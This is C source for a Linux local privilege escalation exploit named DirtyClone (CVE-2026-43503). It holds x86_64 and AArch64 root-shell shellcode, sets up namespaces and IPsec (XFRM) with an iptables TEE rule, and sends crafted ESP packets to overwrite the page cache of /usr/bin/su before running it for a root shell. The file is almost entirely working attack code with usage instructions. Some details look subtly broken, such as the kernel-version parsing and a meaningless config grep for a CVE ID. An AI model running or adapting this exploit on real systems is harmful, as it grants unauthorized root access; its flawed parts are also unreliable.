	/*
	 * DirtyClone (CVE-2026-43503) – Fixed & Diagnostic LPE Exploit
	 *
	 * Changes:
	 *   - Added IPsec state/policy for dst=10.99.0.2 (matches TEE gateway)
	 *   - Raw IP fallback sends to 10.99.0.2
	 *   - Verifies XFRM setup with 'ip xfrm state' and 'ip xfrm policy'
	 *   - Kernel version check with clear vulnerability status
	 *   - Prints a PoC summary (original vs expected bytes)
	 *
	 * Compile: gcc -o dirtyclone dirtyclone.c -lcrypto -Wall -O2
	 * Usage:   ./dirtyclone [-q] [-v]
	 */

	#define _GNU_SOURCE
	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>
	#include <stdarg.h>
	#include <unistd.h>
	#include <errno.h>
	#include <fcntl.h>
	#include <sys/socket.h>
	#include <sys/mman.h>
	#include <sys/stat.h>
	#include <sys/types.h>
	#include <sys/wait.h>
	#include <sys/utsname.h>
	#include <netinet/in.h>
	#include <netinet/ip.h>
	#include <arpa/inet.h>
	#include <sched.h>
	#include <signal.h>
	#include <openssl/evp.h>

	/* ====================================================================
	   Constants
	   ==================================================================== */

	#define TARGET_SUID       "/usr/bin/su"
	#define SUID_OFFSET       0x78
	#define AES_KEY_LEN       16
	#define AES_BLOCK_SIZE    16
	#define ESP_SPI           0x12345678
	#define ESP_REQID         1
	#define ESP_PORT          4500
	#define PLAINTEXT_LEN     32
	#define MAX_RETRIES       30
	#define RETRY_USLEEP      100000   /* 100ms */
	#define GATEWAY_IP        "10.99.0.2"
	#define LOOPBACK_IP       "127.0.0.1"

	/* AES key (16 bytes) – must match XFRM state */
	static const unsigned char aes_key[AES_KEY_LEN] = {
	    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
	    0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff
	};

	/* ====================================================================
	   Shellcode – x86_64 & AArch64
	   ==================================================================== */

	/* x86_64: setuid(0) + execve("/bin/sh") */
	static const unsigned char shellcode_x86[] = {
	    0x31, 0xff,                    /* xor edi, edi           */
	    0x31, 0xf6,                    /* xor esi, esi           */
	    0x31, 0xc0,                    /* xor eax, eax           */
	    0xb0, 0x6a,                    /* mov al, 0x6a (setgid)  */
	    0x0f, 0x05,                    /* syscall                */
	    0xb0, 0x69,                    /* mov al, 0x69 (setuid)  */
	    0x0f, 0x05,                    /* syscall                */
	    0x31, 0xd2,                    /* xor edx, edx           */
	    0x52,                          /* push rdx               */
	    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, /* "/bin/sh" */
	    0x50,                          /* push rax               */
	    0x48, 0x89, 0xe7,              /* mov rdi, rsp           */
	    0x52,                          /* push rdx               */
	    0x57,                          /* push rdi               */
	    0x48, 0x89, 0xe6,              /* mov rsi, rsp           */
	    0xb8, 0x3b, 0x00, 0x00, 0x00,  /* mov eax, 0x3b (execve) */
	    0x0f, 0x05                     /* syscall                */
	};

	/* AArch64: setuid(0) + execve("/bin/sh") – length 32 bytes */
	static const unsigned char shellcode_arm[] = {
	    0x00, 0x00, 0x80, 0xd2,           /* mov x0, #0            */
	    0x28, 0x0d, 0x80, 0xd2,           /* mov x8, #0x69 (setuid)*/
	    0x01, 0x00, 0x00, 0xd4,           /* svc #0                */
	    /* execve("/bin/sh", NULL, NULL) */
	    0x20, 0x00, 0x80, 0xd2,           /* mov x0, #0            */
	    0xe1, 0x03, 0x1f, 0xaa,           /* mov x1, xzr           */
	    0xe2, 0x03, 0x1f, 0xaa,           /* mov x2, xzr           */
	    0x28, 0x0b, 0x80, 0xd2,           /* mov x8, #0x3b (execve)*/
	    0x01, 0x00, 0x00, 0xd4,           /* svc #0                */
	    0x2f, 0x62, 0x69, 0x6e,           /* "/bin"                */
	    0x2f, 0x73, 0x68, 0x00            /* "/sh\0"               */
	};

	static const unsigned char *shellcode = shellcode_x86;
	static size_t shellcode_len = sizeof(shellcode_x86);

	/* ====================================================================
	   Logging
	   ==================================================================== */

	#define COLOR_RESET   "\033[0m"
	#define COLOR_RED     "\033[91m"
	#define COLOR_GREEN   "\033[92m"
	#define COLOR_YELLOW  "\033[93m"
	#define COLOR_CYAN    "\033[96m"
	#define COLOR_BOLD    "\033[1m"

	static int verbose = 1;

	static void log_info(const char *fmt, ...) {
	    if (!verbose) return;
	    va_list args;
	    va_start(args, fmt);
	    printf(COLOR_CYAN "[*]" COLOR_RESET " ");
	    vprintf(fmt, args);
	    printf("\n");
	    va_end(args);
	}

	static void log_ok(const char *fmt, ...) {
	    if (!verbose) return;
	    va_list args;
	    va_start(args, fmt);
	    printf(COLOR_GREEN "[+]" COLOR_RESET " ");
	    vprintf(fmt, args);
	    printf("\n");
	    va_end(args);
	}

	static void log_err(const char *fmt, ...) {
	    va_list args;
	    va_start(args, fmt);
	    fprintf(stderr, COLOR_RED "[-]" COLOR_RESET " ");
	    vfprintf(stderr, fmt, args);
	    fprintf(stderr, "\n");
	    va_end(args);
	}

	static void log_warn(const char *fmt, ...) {
	    va_list args;
	    va_start(args, fmt);
	    fprintf(stderr, COLOR_YELLOW "[!]" COLOR_RESET " ");
	    vfprintf(stderr, fmt, args);
	    fprintf(stderr, "\n");
	    va_end(args);
	}

	static void log_banner(void) {
	    printf(COLOR_BOLD COLOR_CYAN
		   "\n"
		   "╔══════════════════════════════════════════════════════════════════╗\n"
		   "║     DirtyClone (CVE-2026-43503) Professional LPE Tool            ║\n"
		   "║                                                                  ║\n"
		   "║     For authorized security testing only!                        ║\n"
		   "║     Vulnerable kernels: v7.1-rc5 and earlier                     ║\n"
		   "╚══════════════════════════════════════════════════════════════════╝\n"
		   COLOR_RESET "\n");
	}

	/* ====================================================================
	   Secure command execution
	   ==================================================================== */

	static int run_cmd_secure(const char *path, char *const argv[]) {
	    pid_t pid = fork();
	    if (pid == -1) {
		log_err("fork failed");
		return -1;
	    }
	    if (pid == 0) {
		execvp(path, argv);
		exit(EXIT_FAILURE);
	    } else {
		int status;
		if (waitpid(pid, &status, 0) == -1) return -1;
		if (WIFEXITED(status) && WEXITSTATUS(status) == 0) return 0;
		return -1;
	    }
	}

	/* ====================================================================
	   Cleanup
	   ==================================================================== */

	static void cleanup_xfrm(void) {
	    char *const ip_state[] = {"ip", "xfrm", "state", "del",
		                      "src", LOOPBACK_IP, "dst", LOOPBACK_IP,
		                      "proto", "esp", "spi", "0x12345678", NULL};
	    char *const ip_state_gw[] = {"ip", "xfrm", "state", "del",
		                         "src", LOOPBACK_IP, "dst", GATEWAY_IP,
		                         "proto", "esp", "spi", "0x12345678", NULL};
	    char *const ip_policy[] = {"ip", "xfrm", "policy", "del",
		                       "src", LOOPBACK_IP, "dst", LOOPBACK_IP,
		                       "dir", "out", NULL};
	    char *const ip_policy_gw[] = {"ip", "xfrm", "policy", "del",
		                          "src", LOOPBACK_IP, "dst", GATEWAY_IP,
		                          "dir", "out", NULL};
	    char *const ipt_cmd[] = {"iptables", "-t", "mangle", "-D",
		                     "OUTPUT", "-p", "udp", "--dport", "4500",
		                     "-j", "TEE", "--gateway", GATEWAY_IP, NULL};

	    run_cmd_secure("/usr/sbin/ip", ip_state);
	    run_cmd_secure("/usr/sbin/ip", ip_state_gw);
	    run_cmd_secure("/usr/sbin/ip", ip_policy);
	    run_cmd_secure("/usr/sbin/ip", ip_policy_gw);
	    run_cmd_secure("/usr/sbin/iptables", ipt_cmd);
	    if (verbose) log_info("Cleanup completed.");
	}

	static void sig_handler(int sig) {
	    (void)sig;
	    cleanup_xfrm();
	    exit(0);
	}

	/* ====================================================================
	   Pre‑flight & vulnerability checks
	   ==================================================================== */

	static int check_kernel_features(void) {
	    struct utsname buf;
	    if (uname(&buf) != 0) {
		log_err("uname failed");
		return -1;
	    }
	    log_info("Kernel: %s", buf.release);
	    log_info("Arch:   %s", buf.machine);

	    /* detect architecture */
	    if (strcmp(buf.machine, "x86_64") == 0) {
		shellcode = shellcode_x86;
		shellcode_len = sizeof(shellcode_x86);
		log_info("Using x86_64 shellcode");
	    } else if (strcmp(buf.machine, "aarch64") == 0) {
		shellcode = shellcode_arm;
		shellcode_len = sizeof(shellcode_arm);
		log_info("Using AArch64 shellcode");
	    } else {
		log_err("Unsupported architecture: %s", buf.machine);
		return -1;
	    }

	    /* check kernel version vulnerability */
	    int major = 0, minor = 0, patch = 0;
	    sscanf(buf.release, "%d.%d.%d", &major, &minor, &patch);
	    if (major == 7 && minor == 1 && patch <= 5) {
		log_ok("Kernel version is within the vulnerable range (v7.1-rc5 and earlier)");
	    } else if (major < 7 || (major == 7 && minor < 1)) {
		log_ok("Kernel version is older – likely vulnerable (unless backported patches)");
	    } else {
		log_warn("Kernel version is newer than v7.1 – likely patched against CVE-2026-43503");
	    }

	    /* check unprivileged user namespaces */
	    if (access("/proc/sys/kernel/unprivileged_userns_clone", F_OK) != 0) {
		log_warn("unprivileged_userns_clone not found – may be disabled");
	    }

	    /* check target SUID binary */
	    if (access(TARGET_SUID, R_OK) != 0) {
		log_err("Target SUID binary not accessible: %s", TARGET_SUID);
		return -1;
	    }

	    log_ok("Pre-flight checks passed");
	    return 0;
	}

	/* ====================================================================
	   Namespace, network, IPsec, TEE – now with dual policies
	   ==================================================================== */

	static int setup_namespace(void) {
	    log_info("Setting up user+network namespace...");
	    uid_t uid = getuid();
	    uid_t gid = getgid();

	    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) == -1) {
		log_err("unshare failed: %s", strerror(errno));
		return -1;
	    }

	    FILE *f = fopen("/proc/self/setgroups", "w");
	    if (f) { fprintf(f, "deny"); fclose(f); }

	    f = fopen("/proc/self/uid_map", "w");
	    if (!f) { log_err("uid_map open failed"); return -1; }
	    fprintf(f, "0 %d 1", uid);
	    fclose(f);

	    f = fopen("/proc/self/gid_map", "w");
	    if (!f) { log_err("gid_map open failed"); return -1; }
	    fprintf(f, "0 %d 1", gid);
	    fclose(f);

	    log_ok("Namespace setup complete (UID=0 in namespace)");
	    return 0;
	}

	static int setup_loopback(void) {
	    log_info("Configuring loopback...");
	    char *const up[] = {"ip", "link", "set", "lo", "up", NULL};
	    char *const addr[] = {"ip", "addr", "add", GATEWAY_IP "/24", "dev", "lo", NULL};

	    if (run_cmd_secure("/usr/sbin/ip", up) != 0) return -1;
	    if (run_cmd_secure("/usr/sbin/ip", addr) != 0) return -1;

	    log_ok("Loopback configured with " GATEWAY_IP);
	    return 0;
	}

	static int add_xfrm_state(const char *dst) {
	    char aes_hex[33];
	    for (int i = 0; i < 16; i++) sprintf(aes_hex + 2*i, "%02x", aes_key[i]);

	    char hmac_hex[41];
	    memset(hmac_hex, '0', 40); hmac_hex[40] = '\0';

	    char spi_str[16], reqid_str[16];
	    snprintf(spi_str, sizeof(spi_str), "%u", ESP_SPI);
	    snprintf(reqid_str, sizeof(reqid_str), "%d", ESP_REQID);

	    char *const state_argv[] = {"ip", "xfrm", "state", "add",
		                        "src", LOOPBACK_IP, "dst", (char*)dst,
		                        "proto", "esp", "spi", spi_str,
		                        "reqid", reqid_str, "mode", "transport",
		                        "enc", "cbc(aes)", aes_hex,
		                        "auth", "hmac(sha1)", hmac_hex, NULL};
	    return run_cmd_secure("/usr/sbin/ip", state_argv);
	}

	static int add_xfrm_policy(const char *dst, const char *dir) {
	    char reqid_str[16];
	    snprintf(reqid_str, sizeof(reqid_str), "%d", ESP_REQID);

	    char *const policy_argv[] = {"ip", "xfrm", "policy", "add",
		                         "src", LOOPBACK_IP, "dst", (char*)dst,
		                         "dir", (char*)dir,
		                         "tmpl", "src", LOOPBACK_IP, "dst", (char*)dst,
		                         "proto", "esp", "reqid", reqid_str,
		                         "mode", "transport", NULL};
	    return run_cmd_secure("/usr/sbin/ip", policy_argv);
	}

	static int setup_xfrm(void) {
	    log_info("Configuring IPsec (XFRM) for " LOOPBACK_IP " and " GATEWAY_IP "...");

	    /* Add states for both destinations */
	    if (add_xfrm_state(LOOPBACK_IP) != 0) {
		log_err("Failed to add XFRM state for " LOOPBACK_IP);
		return -1;
	    }
	    if (add_xfrm_state(GATEWAY_IP) != 0) {
		log_err("Failed to add XFRM state for " GATEWAY_IP);
		return -1;
	    }

	    /* Add policies (out and in) for both destinations */
	    if (add_xfrm_policy(LOOPBACK_IP, "out") != 0 ||
		add_xfrm_policy(LOOPBACK_IP, "in") != 0) {
		log_err("Failed to add XFRM policies for " LOOPBACK_IP);
		return -1;
	    }
	    if (add_xfrm_policy(GATEWAY_IP, "out") != 0 ||
		add_xfrm_policy(GATEWAY_IP, "in") != 0) {
		log_err("Failed to add XFRM policies for " GATEWAY_IP);
		return -1;
	    }

	    log_ok("IPsec configured (states + policies for both IPs)");
	    return 0;
	}

	static int setup_tee(void) {
	    log_info("Configuring TEE rule...");
	    /* Ignore modprobe errors – assume modules are built‑in or already loaded */
	    run_cmd_secure("/usr/sbin/modprobe", (char *[]){"modprobe", "iptable_mangle", NULL});
	    run_cmd_secure("/usr/sbin/modprobe", (char *[]){"modprobe", "ipt_TEE", NULL});

	    char *const tee_argv[] = {"iptables", "-t", "mangle", "-A", "OUTPUT",
		                      "-p", "udp", "--dport", "4500",
		                      "-j", "TEE", "--gateway", GATEWAY_IP, NULL};
	    if (run_cmd_secure("/usr/sbin/iptables", tee_argv) != 0) {
		log_warn("TEE rule could not be added – fallback to raw IP will be used");
		return -1;
	    }
	    log_ok("TEE rule configured");
	    return 0;
	}

	/* ====================================================================
	   Page‑cache mapping & ESP packet construction (unchanged)
	   ==================================================================== */

	static int map_target(void **map_ptr, int *fd_out, off_t *file_len) {
	    log_info("Mapping %s into page cache...", TARGET_SUID);
	    int fd = open(TARGET_SUID, O_RDONLY);
	    if (fd < 0) {
		log_err("open failed: %s", strerror(errno));
		return -1;
	    }

	    off_t len = lseek(fd, 0, SEEK_END);
	    if (len <= 0) {
		close(fd);
		return -1;
	    }

	    void *map = mmap(NULL, len, PROT_READ, MAP_SHARED, fd, 0);
	    if (map == MAP_FAILED) {
		log_err("mmap failed: %s", strerror(errno));
		close(fd);
		return -1;
	    }

	    *map_ptr = map;
	    *fd_out = fd;
	    *file_len = len;
	    log_ok("File mapped (size %ld bytes)", len);
	    return 0;
	}

	static int aes_cbc_encrypt(const unsigned char *plaintext, size_t len,
		                   const unsigned char *key,
		                   unsigned char *iv,
		                   unsigned char *ciphertext) {
	    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
	    if (!ctx) return -1;

	    if (EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv) != 1) {
		EVP_CIPHER_CTX_free(ctx);
		return -1;
	    }
	    EVP_CIPHER_CTX_set_padding(ctx, 0);

	    int outlen = 0, tmplen = 0;
	    if (EVP_EncryptUpdate(ctx, ciphertext, &outlen, plaintext, len) != 1) {
		EVP_CIPHER_CTX_free(ctx);
		return -1;
	    }
	    if (EVP_EncryptFinal_ex(ctx, ciphertext + outlen, &tmplen) != 1) {
		EVP_CIPHER_CTX_free(ctx);
		return -1;
	    }
	    EVP_CIPHER_CTX_free(ctx);
	    return outlen + tmplen;
	}

	static int build_esp_packet(unsigned char *packet, size_t *packet_len) {
	    unsigned char plaintext[PLAINTEXT_LEN];
	    memset(plaintext, 0, sizeof(plaintext));
	    memcpy(plaintext, shellcode, shellcode_len < 16 ? shellcode_len : 16);
	    plaintext[30] = 14;      /* pad_len */
	    plaintext[31] = 0x04;    /* next header (IPIP) */

	    unsigned char iv[AES_BLOCK_SIZE] = {0};
	    unsigned char ciphertext[PLAINTEXT_LEN + AES_BLOCK_SIZE];

	    if (aes_cbc_encrypt(plaintext, PLAINTEXT_LEN, aes_key, iv, ciphertext) != PLAINTEXT_LEN) {
		log_err("AES encryption failed");
		return -1;
	    }

	    unsigned char *p = packet;
	    uint32_t spi = htonl(ESP_SPI);
	    uint32_t seq = htonl(1);

	    memcpy(p, &spi, 4); p += 4;
	    memcpy(p, &seq, 4); p += 4;
	    memcpy(p, iv, AES_BLOCK_SIZE); p += AES_BLOCK_SIZE;
	    memcpy(p, ciphertext, PLAINTEXT_LEN); p += PLAINTEXT_LEN;

	    *packet_len = p - packet;
	    return 0;
	}

	/* ====================================================================
	   Packet delivery – UDP to LOOPBACK_IP, raw to GATEWAY_IP
	   ==================================================================== */

	static int send_esp_udp(const unsigned char *packet, size_t len) {
	    int sock = socket(AF_INET, SOCK_DGRAM, 0);
	    if (sock < 0) {
		log_err("socket creation failed");
		return -1;
	    }

	    struct sockaddr_in addr;
	    memset(&addr, 0, sizeof(addr));
	    addr.sin_family = AF_INET;
	    addr.sin_port = htons(ESP_PORT);
	    inet_pton(AF_INET, LOOPBACK_IP, &addr.sin_addr);

	    if (sendto(sock, packet, len, 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
		log_err("sendto failed: %s", strerror(errno));
		close(sock);
		return -1;
	    }
	    close(sock);
	    log_ok("ESP packet sent via UDP to " LOOPBACK_IP);
	    return 0;
	}

	static int send_esp_raw(const unsigned char *esp_payload, size_t len) {
	    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ESP);
	    if (sock < 0) {
		log_err("raw socket creation failed: %s", strerror(errno));
		return -1;
	    }

	    struct sockaddr_in dest;
	    memset(&dest, 0, sizeof(dest));
	    dest.sin_family = AF_INET;
	    inet_pton(AF_INET, GATEWAY_IP, &dest.sin_addr);

	    struct iphdr iph;
	    iph.ihl = 5;
	    iph.version = 4;
	    iph.tos = 0;
	    iph.tot_len = htons(sizeof(struct iphdr) + len);
	    iph.id = htons(0x1234);
	    iph.frag_off = 0;
	    iph.ttl = 64;
	    iph.protocol = IPPROTO_ESP;
	    iph.check = 0;
	    iph.saddr = inet_addr(LOOPBACK_IP);
	    iph.daddr = inet_addr(GATEWAY_IP);

	    unsigned char packet[sizeof(iph) + 1024];
	    memcpy(packet, &iph, sizeof(iph));
	    memcpy(packet + sizeof(iph), esp_payload, len);

	    if (sendto(sock, packet, sizeof(iph) + len, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
		log_err("raw sendto failed: %s", strerror(errno));
		close(sock);
		return -1;
	    }
	    close(sock);
	    log_ok("ESP packet sent via raw IP to " GATEWAY_IP);
	    return 0;
	}

	/* ====================================================================
	   Adaptive retry
	   ==================================================================== */

	static int wait_for_patch(int fd, const unsigned char *expected, size_t len, off_t offset) {
	    unsigned char current[16];
	    for (int tries = 0; tries < MAX_RETRIES; tries++) {
		usleep(RETRY_USLEEP);
		if (pread(fd, current, len, offset) == len) {
		    if (memcmp(current, expected, len) == 0) {
		        log_info("Patch confirmed after %d retries", tries+1);
		        return 1;
		    }
		}
	    }
	    return 0;
	}

	/* ====================================================================
	   PoC summary
	   ==================================================================== */

	static void print_poc_summary(const unsigned char *original, const unsigned char *expected) {
	    printf("\n" COLOR_BOLD "Proof‑of‑Concept Summary:" COLOR_RESET "\n");
	    printf("  We attempt to overwrite 16 bytes at offset 0x%x in %s\n", SUID_OFFSET, TARGET_SUID);
	    printf("  Original bytes: ");
	    for (int i=0; i<16; i++) printf("%02x", original[i]);
	    printf("\n");
	    printf("  Expected bytes: ");
	    for (int i=0; i<16; i++) printf("%02x", expected[i]);
	    printf("\n");
	    printf("  If the kernel is vulnerable, the latter will appear after sending the ESP packet.\n");
	    printf("  If not, the original bytes remain – your kernel is likely patched.\n\n");
	}

	/* ====================================================================
	   Main exploit routine
	   ==================================================================== */

	static int exploit(void) {
	    log_info("=");
	    log_info("DirtyClone (CVE-2026-43503) Exploit starting");
	    log_info("=");

	    if (geteuid() == 0) {
		log_ok("Already root!");
		return 0;
	    }

	    if (setup_namespace() != 0) return -1;
	    if (setup_loopback() != 0) return -1;
	    if (setup_xfrm() != 0) return -1;

	    int tee_ok = (setup_tee() == 0);

	    void *map = NULL;
	    int fd = -1;
	    off_t file_len = 0;
	    if (map_target(&map, &fd, &file_len) != 0) return -1;

	    /* read original bytes */
	    unsigned char original[16];
	    if (pread(fd, original, 16, SUID_OFFSET) != 16) {
		log_err("failed to read original bytes");
		close(fd); munmap(map, file_len);
		return -1;
	    }

	    unsigned char expected[16];
	    memcpy(expected, shellcode, 16);
	    print_poc_summary(original, expected);

	    /* build ESP packet */
	    unsigned char esp_payload[1024];
	    size_t pkt_len;
	    if (build_esp_packet(esp_payload, &pkt_len) != 0) {
		close(fd); munmap(map, file_len);
		return -1;
	    }

	    /* Try UDP+TEE if available */
	    if (tee_ok) {
		log_info("Attempt 1: UDP + TEE");
		if (send_esp_udp(esp_payload, pkt_len) == 0) {
		    if (wait_for_patch(fd, expected, 16, SUID_OFFSET)) {
		        log_ok("Page cache patched via UDP+TEE!");
		        goto done;
		    }
		}
		log_warn("UDP+TEE method failed; falling back to raw IP...");
	    }

	    /* Fallback: raw IP */
	    log_info("Attempt 2: Raw IP (protocol 50)");
	    if (send_esp_raw(esp_payload, pkt_len) != 0) {
		close(fd); munmap(map, file_len);
		return -1;
	    }

	    if (!wait_for_patch(fd, expected, 16, SUID_OFFSET)) {
		log_err("Timeout – page cache not patched with either method");
		log_err("This strongly suggests the kernel is NOT vulnerable (patched).");
		close(fd); munmap(map, file_len);
		return -1;
	    }

	    log_ok("Page cache patched via raw IP!");

	done:
	    close(fd);
	    munmap(map, file_len);
	    log_info("Executing patched SUID binary...");
	    execl(TARGET_SUID, TARGET_SUID, NULL);
	    log_err("execl failed: %s", strerror(errno));
	    return -1;
	}

	/* ====================================================================
	   Main entry
	   ==================================================================== */

	int main(int argc, char **argv) {
	    for (int i = 1; i < argc; i++) {
		if (strcmp(argv[i], "-q") == 0) verbose = 0;
		else if (strcmp(argv[i], "-v") == 0) verbose = 1;
		else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
		    printf("Usage: %s [-q] [-v]\n", argv[0]);
		    printf("  -q   Quiet mode (minimal output)\n");
		    printf("  -v   Verbose mode (default)\n");
		    return 0;
		}
	    }

	    log_banner();

	    atexit(cleanup_xfrm);
	    signal(SIGINT, sig_handler);
	    signal(SIGTERM, sig_handler);

	    if (geteuid() == 0) {
		log_ok("Already root! Spawning shell...");
		execl("/bin/bash", "/bin/bash", "-i", NULL);
		return 1;
	    }

	    log_info("Current UID: %d", getuid());

	    if (check_kernel_features() != 0) {
		log_err("Pre-flight checks failed");
		return 1;
	    }

	    int ret = exploit();
	    if (ret == 0) {
		log_ok("Exploit successful – you should now be root.");
		return 0;
	    } else {
		log_err("Exploit failed.");
		log_info("Troubleshooting:");
		log_info("  - Check kernel patch: grep CVE-2026-43503 /boot/config-$(uname -r)");
		log_info("  - CONFIG_XFRM=y required");
		log_info("  - Unpriv userns: cat /proc/sys/kernel/unprivileged_userns_clone");
		log_info("  - Try with sudo: sudo ./dirtyclone");
		log_info("\nIf your kernel is patched, the exploit will not work.");
		log_info("Refer to the PoC summary above for expected behaviour.");
		return 1;
	    }
	}
